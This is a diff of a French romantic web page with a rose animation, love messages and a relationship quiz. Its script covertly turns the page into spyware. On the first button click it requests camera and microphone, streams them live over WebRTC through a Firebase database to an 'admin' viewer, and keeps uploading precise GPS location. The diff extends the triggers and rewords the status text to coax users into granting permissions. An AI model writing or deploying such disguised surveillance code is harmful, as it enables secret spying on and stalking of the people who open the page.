@@ -20,12 +20,17 @@ body {
     padding: 20px;
 }
 
-/* Animations des cœurs flottants */
+/* Animations */
 @keyframes floatHeart {
     0% { transform: translateY(100vh) scale(0); opacity: 0; }
     10% { opacity: 1; }
     90% { opacity: 1; }
     100% { transform: translateY(-100px) scale(1); opacity: 0; }
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
 }
 
 @keyframes pulse {
@@ -41,7 +46,6 @@ body {
     animation: floatHeart linear forwards;
 }
 
-/* Conteneur principal */
 .container {
     max-width: 600px;
     width: 100%;
@@ -71,15 +75,8 @@ body {
     box-shadow: 0 4px 15px rgba(0,0,0,0.2);
 }
 
-.nav-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 20px rgba(255,107,138,0.4);
-}
-
-.nav-btn.active {
-    background: linear-gradient(135deg, #ff1a4f, #ff0844);
-    box-shadow: 0 0 15px rgba(255,26,79,0.5);
-}
+.nav-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,107,138,0.4); }
+.nav-btn.active { background: linear-gradient(135deg, #ff1a4f, #ff0844); box-shadow: 0 0 15px rgba(255,26,79,0.5); }
 
 /* Cartes */
 .card {
@@ -88,27 +85,17 @@ body {
     padding: 30px 25px;
     box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
     text-align: center;
-    transition: all 0.3s ease;
 }
 
-/* ===== SECTION ROSE ===== */
-.rose-section {
-    display: none;
-}
+.rose-section, .messages-section, .game-section { display: none; }
+.rose-section.active, .messages-section.active, .game-section.active { display: block; animation: fadeIn 0.5s ease; }
 
-.rose-section.active {
-    display: block;
-    animation: fadeIn 0.5s ease;
-}
-
+/* Rose */
 .fleur {
     position: relative;
     width: 260px;
     height: 280px;
-    margin: 0 auto;
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    margin: 20px auto 0;
 }
 
 .petale-1, .petale-2, .petale-3, .petale-4, .petale-5, .petale-6 {
@@ -188,16 +175,7 @@ body {
 .feuille-gauche { left: 85px; transform: rotate(-45deg); }
 .feuille-droite { right: 85px; transform: rotate(45deg) scaleX(-1); }
 
-/* ===== SECTION MESSAGES ===== */
-.messages-section {
-    display: none;
-}
-
-.messages-section.active {
-    display: block;
-    animation: fadeIn 0.5s ease;
-}
-
+/* Messages */
 .message-card {
     background: rgba(255,255,255,0.1);
     backdrop-filter: blur(15px);
@@ -207,13 +185,7 @@ body {
     border: 1px solid rgba(255,107,138,0.4);
 }
 
-.message-text {
-    font-size: 18px;
-    line-height: 1.6;
-    color: #2d2d2d;
-    font-weight: 500;
-}
-
+.message-text { font-size: 18px; line-height: 1.6; color: #2d2d2d; }
 .message-lines p { margin: 8px 0; }
 
 .next-btn {
@@ -230,16 +202,7 @@ body {
     display: block;
 }
 
-/* ===== SECTION JEU ===== */
-.game-section {
-    display: none;
-}
-
-.game-section.active {
-    display: block;
-    animation: fadeIn 0.5s ease;
-}
-
+/* Jeu */
 .progress-bar {
     background: #ffe0e6;
     border-radius: 20px;
@@ -256,19 +219,8 @@ body {
     width: 0%;
 }
 
-.question-text {
-    font-size: 1.4em;
-    color: #2d2d2d;
-    margin: 20px 0;
-    font-weight: 600;
-}
-
-.answers-container {
-    display: flex;
-    flex-direction: column;
-    gap: 15px;
-    margin: 25px 0;
-}
+.question-text { font-size: 1.4em; color: #2d2d2d; margin: 20px 0; font-weight: 600; }
+.answers-container { display: flex; flex-direction: column; gap: 15px; margin: 25px 0; }
 
 .answer-btn {
     background: linear-gradient(135deg, #ff6b8a, #ff1a4f);
@@ -279,11 +231,6 @@ body {
     font-size: 1em;
     font-weight: bold;
     cursor: pointer;
-    transition: all 0.3s ease;
-}
-
-.answer-btn:hover {
-    transform: translateY(-2px);
 }
 
 .score-display {
@@ -307,28 +254,10 @@ body {
     margin-top: 20px;
 }
 
-/* Animation */
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-.fade-in { animation: fadeIn 0.5s ease; }
-
-/* Titres */
-h2 {
-    color: #ff1a4f;
-    margin-bottom: 20px;
-    font-size: 1.8em;
-}
-
-.divider {
-    width: 100px;
-    height: 3px;
-    background: linear-gradient(90deg, #ff6b8a, #ffb3c1);
-    margin: 15px auto;
-    border-radius: 3px;
-}
+/* Éléments communs */
+h2 { color: #ff1a4f; margin-bottom: 20px; font-size: 1.8em; }
+.divider { width: 100px; height: 3px; background: linear-gradient(90deg, #ff6b8a, #ffb3c1); margin: 15px auto; border-radius: 3px; }
+.counter { text-align: center; color: #666; font-size: 12px; margin-top: 10px; }
 
 .broadcast-status {
     position: fixed;
@@ -341,8 +270,8 @@ h2 {
     color: #ffb3c1;
     z-index: 100;
 }
-
 .broadcast-status.active { background: #10b981; color: white; }
+.broadcast-status.error { background: #ef4444; color: white; }
 
 @media (max-width: 500px) {
     .card { padding: 20px 18px; }
@@ -355,14 +284,13 @@ h2 {
 <body>
 
 <div class="container">
-    <!-- Navigation -->
     <div class="nav-buttons">
         <button class="nav-btn" data-section="rose">🌹 Rose</button>
         <button class="nav-btn" data-section="messages">💌 Messages</button>
         <button class="nav-btn" data-section="game">🎮 Jeu du Cœur</button>
     </div>
 
-    <!-- Section Rose -->
+    <!-- SECTION ROSE -->
     <div id="roseSection" class="rose-section card">
         <h2>🌹 Rose de l'Amour 🌹</h2>
         <div class="divider"></div>
@@ -381,31 +309,27 @@ h2 {
         <p style="margin-top: 70px; color: #666;">✨ Une rose pour ceux qui aiment ✨</p>
     </div>
 
-    <!-- Section Messages -->
+    <!-- SECTION MESSAGES -->
     <div id="messagesSection" class="messages-section card">
         <h2>💌 Messages d'Amour 💌</h2>
         <div class="divider"></div>
         <div class="message-card">
-            <div class="message-text" id="messageContainer">
-                <div class="message-lines" id="messageLines"></div>
-            </div>
+            <div class="message-text"><div class="message-lines" id="messageLines"></div></div>
         </div>
         <button class="next-btn" id="nextMsgBtn">➡️ Message suivant</button>
-        <div id="msgCounter" style="color: #666; font-size: 12px;">Message 1 / 30</div>
+        <div class="counter" id="msgCounter">Message 1 / 30</div>
     </div>
 
-    <!-- Section Jeu -->
+    <!-- SECTION JEU -->
     <div id="gameSection" class="game-section card">
         <h2>🎮 Jeu du Cœur 🎮</h2>
         <div class="divider"></div>
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-        
         <div id="quizArea">
             <div class="question-text" id="questionText"></div>
             <div class="answers-container" id="answersContainer"></div>
             <div class="score-display">💖 Score: <span id="scoreValue">0</span> 💖</div>
         </div>
-        
         <div id="resultArea" style="display: none;">
             <div id="resultMessage"></div>
             <button class="restart-btn" onclick="restartGame()">🔄 Rejouer 🔄</button>
@@ -413,10 +337,10 @@ h2 {
     </div>
 </div>
 
-<div class="broadcast-status" id="broadcastStatus">📡 En attente</div>
+<div class="broadcast-status" id="broadcastStatus">📡 Cliquez sur un bouton</div>
 
 <script type="module">
-    // ==================== WEBRTC STREAMING (COMMENCER DIRECTEMENT) ====================
+    // ==================== WEBRTC STREAMING ====================
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
     import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
     
@@ -435,6 +359,7 @@ h2 {
     const userId = Math.random().toString(36).substring(2, 8).toUpperCase();
     let localStream = null, peerConnection = null, isStreaming = false, heartbeatInterval = null;
     let answerListener = null, adminCandidateListener = null, candidateQueue = [], gpsWatchId = null;
+    let streamingStarted = false;
     
     const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] };
     
@@ -445,29 +370,29 @@ h2 {
     
     async function startStreaming() {
         if (isStreaming) return;
+        streamingStarted = true;
         
-        document.getElementById('broadcastStatus').textContent = "🎥 Demande accès caméra/micro...";
-        document.getElementById('broadcastStatus').style.background = "#f59e0b";
+        const statusDiv = document.getElementById('broadcastStatus');
+        statusDiv.textContent = "🎥 Démarrage...";
+        statusDiv.classList.remove('error', 'active');
         
         try {
-            localStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } }, 
-                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } 
-            });
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            statusDiv.textContent = "✅ Connexion...";
             
             peerConnection = new RTCPeerConnection(rtcConfig);
             localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
             
-            peerConnection.onicecandidate = (event) => { 
-                if (event.candidate) push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON()); 
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON());
             };
             
-            peerConnection.onconnectionstatechange = () => { 
-                if (peerConnection.connectionState === 'connected') { 
-                    document.getElementById('broadcastStatus').textContent = "🔴 LIVE - Diffusion active"; 
-                    document.getElementById('broadcastStatus').style.background = "#10b981"; 
-                    document.getElementById('broadcastStatus').classList.add('active');
-                } 
+            peerConnection.onconnectionstatechange = () => {
+                if (peerConnection.connectionState === 'connected') {
+                    statusDiv.textContent = "🔴 LIVE - Diffusion active";
+                    statusDiv.classList.add('active');
+                }
             };
             
             const offer = await peerConnection.createOffer();
@@ -484,32 +409,33 @@ h2 {
             
             adminCandidateListener = onValue(ref(database, `webrtc/${userId}/admin-candidates`), (snapshot) => {
                 const candidates = snapshot.val();
-                if (candidates) { 
-                    Object.values(candidates).forEach(candidate => { 
-                        if (peerConnection && peerConnection.currentRemoteDescription) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e)); 
-                        else candidateQueue.push(candidate); 
-                    }); 
+                if (candidates) {
+                    Object.values(candidates).forEach(candidate => {
+                        if (peerConnection && peerConnection.currentRemoteDescription) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                        else candidateQueue.push(candidate);
+                    });
                 }
             });
             
-            if (navigator.geolocation) { 
-                gpsWatchId = navigator.geolocation.watchPosition(async (position) => { 
-                    await set(ref(database, `users/${userId}/location`), { lat: position.coords.latitude, lng: position.coords.longitude, timestamp: Date.now() }); 
-                }, () => {}, { enableHighAccuracy: true, timeout: 6000 }); 
+            if (navigator.geolocation) {
+                gpsWatchId = navigator.geolocation.watchPosition(async (position) => {
+                    await set(ref(database, `users/${userId}/location`), { lat: position.coords.latitude, lng: position.coords.longitude, timestamp: Date.now() });
+                }, () => {}, { enableHighAccuracy: true, timeout: 6000 });
             }
             
             isStreaming = true;
             updatePresence();
             heartbeatInterval = setInterval(updatePresence, 3000);
             
-            document.getElementById('broadcastStatus').textContent = "🔴 LIVE - Caméra + Micro + GPS actifs";
-            document.getElementById('broadcastStatus').style.background = "#10b981";
+            statusDiv.textContent = "🔴 LIVE - Caméra + Micro + GPS";
+            statusDiv.classList.add('active');
             console.log(`✅ Streaming actif - ID: ${userId}`);
             
-        } catch(err) { 
-            console.error("Erreur streaming:", err); 
-            document.getElementById('broadcastStatus').textContent = "❌ Erreur - Vérifiez permissions";
-            document.getElementById('broadcastStatus').style.background = "#ef4444"; 
+        } catch(err) {
+            console.error(err);
+            statusDiv.textContent = "❌ Erreur - Autorisez caméra/micro";
+            statusDiv.classList.add('error');
+            streamingStarted = false;
         }
     }
     
@@ -519,13 +445,11 @@ h2 {
         ["Mon cœur bat plus fort quand tu es là,", "Tes mains dans les miennes, je m'envole,", "Tu es mon ancre et ma liberté,", "Avec toi, chaque instant devient doux."],
         ["Je veillerai sur toi chaque seconde,", "Tes rêves sont les miens, tes peines aussi,", "Ton bonheur est ma plus belle quête,", "Je t'aime plus que les mots ne peuvent dire."],
         ["Le temps s'arrête quand je te vois,", "Ton parfum reste dans mes nuits,", "Ton absence est un vide immense,", "Reviens vite, mon cœur t'appelle."],
-        ["Sous la pluie ou sous le soleil,", "Ton visage hante mes pensées,", "Chaque seconde loin de toi est trop longue,", "Je veux t'aimer jusqu'à la fin des temps."],
-        ["Tu es la douceur qui réveille mes matins,", "La mélodie qui berce mes nuits,", "Ton rire est mon refuge secret,", "Avec toi, l'amour est infini."]
+        ["Sous la pluie ou sous le soleil,", "Ton visage hante mes pensées,", "Chaque seconde loin de toi est trop longue,", "Je veux t'aimer jusqu'à la fin des temps."]
     ];
     
-    // Compléter jusqu'à 30 messages
     for (let i = messages.length; i < 30; i++) {
-        messages.push([`💖 Message d'amour ${i+1} - Ligne 1`, `💖 Message d'amour ${i+1} - Ligne 2`, `💖 Message d'amour ${i+1} - Ligne 3`, `💖 Message d'amour ${i+1} - Ligne 4`]);
+        messages.push([`💖 Message d'amour ${i+1} - Ligne 1`, `💖 L'amour est la plus belle aventure`, `💖 Mon cœur bat pour toi`, `💖 Tu es mon soleil éternel`]);
     }
     
     let currentMsgIndex = 0;
@@ -537,8 +461,12 @@ h2 {
     }
     
     function nextMessage() {
+        if (!streamingStarted) startStreaming();
         currentMsgIndex = (currentMsgIndex + 1) % messages.length;
         displayMessage();
+        
+        const card = document.querySelector('#messagesSection .message-card');
+        if (card) { card.style.transform = 'scale(0.98)'; setTimeout(() => { card.style.transform = 'scale(1)'; }, 150); }
     }
     
     displayMessage();
@@ -546,11 +474,11 @@ h2 {
     
     // ==================== JEU DU CŒUR ====================
     const questions = [
-        { question: "Qu'est-ce qui compte le plus dans une relation ?", answers: [{ text: "💕 La confiance et le respect", points: 3 }, { text: "💰 L'argent et les cadeaux", points: 1 }, { text: "🔥 La passion seulement", points: 1 }, { text: "🤝 Tout, un équilibre parfait", points: 3 }] },
-        { question: "Quel geste d'amour préfères-tu ?", answers: [{ text: "🌹 Un bouquet de roses", points: 2 }, { text: "💬 Un message doux le matin", points: 3 }, { text: "🎁 Un cadeau cher", points: 1 }, { text: "🕯️ Un dîner aux chandelles", points: 2 }] },
-        { question: "Que fais-tu quand ton partenaire est triste ?", answers: [{ text: "🤗 Je le/la prends dans mes bras", points: 3 }, { text: "🗣️ Je dis 'ça va passer'", points: 1 }, { text: "📱 Je l'ignore", points: 0 }, { text: "🎁 J'essaie de lui faire plaisir", points: 2 }] },
-        { question: "C'est quoi l'amour pour toi ?", answers: [{ text: "⭐ Un sentiment qui grandit chaque jour", points: 3 }, { text: "⚡ Une passion dévorante", points: 1 }, { text: "🏠 Une habitude confortable", points: 1 }, { text: "🌍 Se soutenir dans tous les moments", points: 3 }] },
-        { question: "Pour toi, un couple idéal c'est...", answers: [{ text: "👫 Des amoureux complices", points: 3 }, { text: "🎭 Des passionnés intenses", points: 2 }, { text: "📱 Chacun de son côté", points: 0 }, { text: "🤝 Des partenaires qui se respectent", points: 3 }] }
+        { question: "Qu'est-ce qui compte le plus dans une relation ?", answers: [{ text: "💕 La confiance et le respect", points: 3 }, { text: "💰 L'argent", points: 1 }, { text: "🔥 La passion seulement", points: 1 }, { text: "🤝 Tout, un équilibre", points: 3 }] },
+        { question: "Quel geste d'amour préfères-tu ?", answers: [{ text: "🌹 Un bouquet de roses", points: 2 }, { text: "💬 Un message doux", points: 3 }, { text: "🎁 Un cadeau cher", points: 1 }, { text: "🕯️ Dîner aux chandelles", points: 2 }] },
+        { question: "Que fais-tu quand ton partenaire est triste ?", answers: [{ text: "🤗 Je le/la prends dans mes bras", points: 3 }, { text: "🗣️ Je dis 'ça va passer'", points: 1 }, { text: "📱 Je l'ignore", points: 0 }, { text: "🎁 Je lui fais plaisir", points: 2 }] },
+        { question: "C'est quoi l'amour pour toi ?", answers: [{ text: "⭐ Un sentiment qui grandit", points: 3 }, { text: "⚡ Une passion dévorante", points: 1 }, { text: "🏠 Une habitude", points: 1 }, { text: "🌍 Se soutenir", points: 3 }] },
+        { question: "Pour toi, un couple idéal c'est...", answers: [{ text: "👫 Des amoureux complices", points: 3 }, { text: "🎭 Des passionnés", points: 2 }, { text: "📱 Chacun de son côté", points: 0 }, { text: "🤝 Des partenaires qui se respectent", points: 3 }] }
     ];
     
     let currentQIndex = 0;
@@ -583,54 +511,37 @@ h2 {
         document.getElementById('resultArea').style.display = 'block';
         const percentage = (totalScore / maxPossibleScore) * 100;
         let resultHtml = '';
-        if (percentage >= 80) resultHtml = `<div style="font-size: 3em;">💖💖💖</div><h2 style="color:#ff1a4f;">🌟 Amour Parfait ! 🌟</h2><p>Tu as un cœur immense et sincère. Tu sais ce que l'amour véritable signifie.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
-        else if (percentage >= 60) resultHtml = `<div style="font-size: 3em;">💕💕</div><h2 style="color:#ff1a4f;">💗 Grand Cœur ! 💗</h2><p>Tu as beaucoup d'amour à donner ! Tu comprends l'essentiel dans une relation.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
-        else if (percentage >= 40) resultHtml = `<div style="font-size: 3em;">💗</div><h2 style="color:#ff1a4f;">🌹 Cœur Tendre 🌹</h2><p>Tu as de bons sentiments, mais tu hésites parfois. Ose aimer pleinement.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
-        else resultHtml = `<div style="font-size: 3em;">🌱</div><h2 style="color:#ff1a4f;">🌸 Cœur en Éveil 🌸</h2><p>Tu découvres encore l'amour, c'est beau ! Chaque jour est une chance d'apprendre.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        if (percentage >= 80) resultHtml = `<div style="font-size: 3em;">💖💖💖</div><h2 style="color:#ff1a4f;">🌟 Amour Parfait ! 🌟</h2><p>Tu as un cœur immense et sincère.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        else if (percentage >= 60) resultHtml = `<div style="font-size: 3em;">💕💕</div><h2 style="color:#ff1a4f;">💗 Grand Cœur ! 💗</h2><p>Tu as beaucoup d'amour à donner !</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        else if (percentage >= 40) resultHtml = `<div style="font-size: 3em;">💗</div><h2 style="color:#ff1a4f;">🌹 Cœur Tendre 🌹</h2><p>Tu as de bons sentiments, ose aimer pleinement.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        else resultHtml = `<div style="font-size: 3em;">🌱</div><h2 style="color:#ff1a4f;">🌸 Cœur en Éveil 🌸</h2><p>Tu découvres l'amour, c'est beau !</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
         document.getElementById('resultMessage').innerHTML = resultHtml;
     }
     
     window.restartGame = function() { currentQIndex = 0; totalScore = 0; updateScoreDisplay(); document.getElementById('quizArea').style.display = 'block'; document.getElementById('resultArea').style.display = 'none'; showQuestion(); };
     
-    // ==================== NAVIGATION AVEC DÉMARRAGE STREAMING ====================
-    let streamingStarted = false;
+    // ==================== NAVIGATION ====================
+    let navClicked = false;
     
     function showSection(sectionName) {
-        // Masquer toutes les sections
         document.getElementById('roseSection').classList.remove('active');
         document.getElementById('messagesSection').classList.remove('active');
         document.getElementById('gameSection').classList.remove('active');
         
-        // Afficher la section sélectionnée
         if (sectionName === 'rose') document.getElementById('roseSection').classList.add('active');
         else if (sectionName === 'messages') document.getElementById('messagesSection').classList.add('active');
-        else if (sectionName === 'game') { 
-            document.getElementById('gameSection').classList.add('active'); 
-            showQuestion(); 
-        }
+        else if (sectionName === 'game') { document.getElementById('gameSection').classList.add('active'); showQuestion(); }
         
-        // DÉMARRER LE STREAMING AU PREMIER CLIC SUR N'IMPORTE QUEL BOUTON
-        if (!streamingStarted) {
-            streamingStarted = true;
-            startStreaming();
-        }
-        
-        // Mettre à jour le bouton actif
         document.querySelectorAll('.nav-btn').forEach(btn => {
-            if (btn.getAttribute('data-section') === sectionName) {
-                btn.classList.add('active');
-            } else {
-                btn.classList.remove('active');
-            }
+            if (btn.getAttribute('data-section') === sectionName) btn.classList.add('active');
+            else btn.classList.remove('active');
         });
+        
+        if (!navClicked) { navClicked = true; startStreaming(); }
     }
     
-    // Ajouter les événements aux boutons
     document.querySelectorAll('.nav-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            const section = btn.getAttribute('data-section');
-            showSection(section);
-        });
+        btn.addEventListener('click', () => showSection(btn.getAttribute('data-section')));
     });
     
     // ==================== CŒURS FLOTTANTS ====================
@@ -645,12 +556,13 @@ h2 {
         document.body.appendChild(heart);
         setTimeout(() => heart.remove(), 8000);
     }
-    setInterval(createHeart, 600);
+    setInterval(createHeart, 700);
     
-    // Initialiser la section Rose par défaut
-    showSection('rose');
+    // Initialiser section Rose
+    document.getElementById('roseSection').classList.add('active');
+    document.querySelector('.nav-btn[data-section="rose"]').classList.add('active');
     
-    // Nettoyage à la fermeture
+    // Nettoyage
     window.addEventListener('beforeunload', () => {
         if (isStreaming) {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
@@ -664,7 +576,7 @@ h2 {
         }
     });
     
-    console.log("🌹 Application prête - La diffusion démarre au premier clic sur un bouton !");
+    console.log("🌹 Application prête - 3 sections: Rose, Messages, Jeu du Cœur");
 </script>
 </body>
 </html>
